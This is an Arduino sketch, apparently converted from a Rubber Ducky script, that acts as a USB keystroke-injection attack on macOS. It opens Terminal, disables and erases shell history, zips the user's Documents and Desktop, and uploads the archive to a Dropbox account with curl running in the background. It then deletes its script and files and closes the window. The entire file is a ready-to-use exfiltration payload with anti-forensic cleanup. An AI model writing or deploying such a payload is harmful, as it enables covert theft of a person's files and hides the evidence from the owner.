// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script will create a folder on the desktop named "backup"
  // it will then copy the Documents and Desktop contents to the folder and create a .zip
  // Once the zip is created it will proceed to send all the contents to your Dropbox
  // you MUST replace "<API access token here>" with your actual API accesss token
  // Title: Docs and Desktop to Dropbox API
  // Author: Narsty
  // Target: MacOS
  // Version: 1.0
  // Category: Execution
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("Terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" mkdir -p ~/Desktop/Backup/Desktop");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" mkdir -p ~/Desktop/Backup/Documents");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" cp -R ~/Documents/* ~/Desktop/Backup/Documents/");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" cp -R ~/Desktop/* ~/Desktop/Backup/Desktop/");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" echo 'cd ~/Desktop/Backup && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H \"Authorization: Bearer <API access token here>\" -H \"Dropbox-API-Arg: {\\\"path\\\": \\\"/Backup/backup.zip\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false}\" -H \"Content-Type: application/octet-stream\" --data-binary @backup.zip' > upload.sh");

  typeKey(KEY_RETURN);

  delay(2500);

  typeKey(KEY_RETURN);

  Keyboard.print(" chmod +x upload.sh");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" nohup ./upload.sh >/dev/null 2>&1 &");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" rm upload.sh");

  delay(500);

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.print(" rm -r ~/Desktop/backup");

  delay(500);

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.print(" rm backup.zip");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" clear");

  delay(500);

  typeKey(KEY_RETURN);

  delay(250);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  delay(1000);

  typeKey(KEY_RETURN);

  delay(250);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}